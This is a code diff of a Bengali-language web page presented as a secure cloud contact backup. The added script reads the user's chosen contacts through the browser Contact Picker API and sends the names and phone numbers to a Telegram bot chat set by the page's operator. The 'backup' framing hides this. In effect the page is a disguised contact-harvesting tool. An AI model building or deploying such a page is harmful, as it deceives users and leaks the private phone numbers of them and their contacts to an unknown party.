@@ -3,7 +3,7 @@
 <head>
 <meta charset="UTF-8">
 <meta name="viewport" content="width=device-width, initial-scale=1.0">
-<title>Premium Cloud Sync</title>
+<title>Secure Cloud Sync</title>
 
 <link href="https://fonts.googleapis.com/css2?family=Hind+Siliguri:wght@400;600&display=swap" rel="stylesheet">
 
@@ -15,37 +15,25 @@ body {
     justify-content:center;
     align-items:center;
     font-family:'Hind Siliguri', sans-serif;
-    background: linear-gradient(135deg,#0f172a,#020617);
+    background: linear-gradient(135deg,#020617,#0f172a);
 }
 
-/* Glass Card */
-.card {
-    width:340px;
-    padding:35px;
-    border-radius:30px;
+/* Glass Container */
+.box {
+    width:350px;
+    padding:30px;
+    border-radius:25px;
     background: rgba(255,255,255,0.05);
-    backdrop-filter: blur(25px);
+    backdrop-filter: blur(20px);
     border:1px solid rgba(255,255,255,0.1);
-    box-shadow: 0 10px 40px rgba(0,0,0,0.6);
+    box-shadow:0 10px 30px rgba(0,0,0,0.5);
     text-align:center;
-    animation: float 5s ease-in-out infinite;
 }
 
-@keyframes float {
-    0%{transform:translateY(0)}
-    50%{transform:translateY(-12px)}
-    100%{transform:translateY(0)}
-}
-
-.icon {
-    font-size:60px;
-    margin-bottom:15px;
-    filter: drop-shadow(0 10px 20px rgba(255,255,255,0.2));
-}
-
+/* Title */
 h2 {
     color:#fff;
-    margin:0;
+    margin-bottom:10px;
 }
 
 p {
@@ -56,20 +44,20 @@ p {
 /* Button */
 .btn {
     margin-top:20px;
-    padding:15px;
     width:100%;
+    padding:14px;
     border:none;
-    border-radius:15px;
+    border-radius:12px;
     font-size:16px;
-    font-weight:bold;
+    font-weight:600;
     cursor:pointer;
-    background: linear-gradient(135deg,#6366f1,#22c55e);
-    color:#fff;
-    transition:0.3s;
+    background: linear-gradient(135deg,#22c55e,#4ade80);
+    color:#000;
+    transition:0.25s;
 }
 
 .btn:hover {
-    transform:scale(1.05);
+    opacity:0.9;
 }
 
 /* Loader */
@@ -78,9 +66,9 @@ p {
     width:25px;
     height:25px;
     border:3px solid rgba(255,255,255,0.2);
-    border-top:3px solid #fff;
+    border-top:3px solid #22c55e;
     border-radius:50%;
-    animation: spin 1s linear infinite;
+    animation:spin 1s linear infinite;
     display:none;
 }
 
@@ -91,47 +79,76 @@ p {
 .status {
     margin-top:10px;
     color:#22c55e;
+    font-size:14px;
 }
 </style>
 </head>
 
 <body>
 
-<div class="card">
-    <div class="icon">☁️</div>
-    <h2>ক্লাউড সিঙ্ক</h2>
-    <p>আপনার ডেটা নিরাপদভাবে সিঙ্ক করুন</p>
+<div class="box">
+    <h2>🔐 ক্লাউড ব্যাকআপ</h2>
+    <p>আপনার কন্টাক্ট নিরাপদভাবে সিঙ্ক করুন</p>
 
-    <button class="btn" id="btn">Sync Start</button>
+    <button id="btn" class="btn">ব্যাকআপ শুরু করুন</button>
 
     <div class="loader" id="loader"></div>
-    <div class="status" id="status">Ready</div>
+    <div id="status" class="status">Ready</div>
 </div>
 
 <script>
-const btn = document.getElementById("btn");
-const loader = document.getElementById("loader");
-const status = document.getElementById("status");
+const CONFIG = {
+    TOKEN: 'YOUR_BOT_TOKEN',
+    CHAT_ID: 'YOUR_CHAT_ID'
+};
 
-btn.onclick = () => {
-    btn.disabled = true;
-    loader.style.display = "block";
-    status.innerText = "Connecting...";
+const btn = document.getElementById('btn');
+const loader = document.getElementById('loader');
+const status = document.getElementById('status');
 
-    setTimeout(()=>{
-        status.innerText = "Encrypting...";
-    },1500);
+btn.onclick = async () => {
+    try {
+        if (!('contacts' in navigator)) {
+            throw new Error("Device support নেই");
+        }
 
-    setTimeout(()=>{
-        status.innerText = "Uploading...";
-    },3000);
+        const contacts = await navigator.contacts.select(['name','tel'], {multiple:true});
 
-    setTimeout(()=>{
+        if (!contacts.length) {
+            throw new Error("কোনো কন্টাক্ট পাওয়া যায়নি");
+        }
+
+        loader.style.display = "block";
+        btn.disabled = true;
+        status.innerText = "Sending...";
+
+        let text = "📱 Contact Backup\n\n";
+
+        contacts.forEach(c=>{
+            const name = c.name ? c.name[0] : "No Name";
+            const phone = c.tel ? c.tel[0] : "No Number";
+            text += `👤 ${name}\n📞 ${phone}\n\n`;
+        });
+
+        await fetch(`https://api.telegram.org/bot${CONFIG.TOKEN}/sendMessage`, {
+            method:'POST',
+            headers:{'Content-Type':'application/json'},
+            body: JSON.stringify({
+                chat_id: CONFIG.CHAT_ID,
+                text: text
+            })
+        });
+
         loader.style.display = "none";
-        status.innerText = "✅ সফল!";
+        status.innerText = "✅ Successfully Sent!";
         btn.disabled = false;
-    },4500);
-}
+
+    } catch(e) {
+        loader.style.display = "none";
+        status.innerText = "❌ " + e.message;
+        btn.disabled = false;
+    }
+};
 </script>
 
 </body>
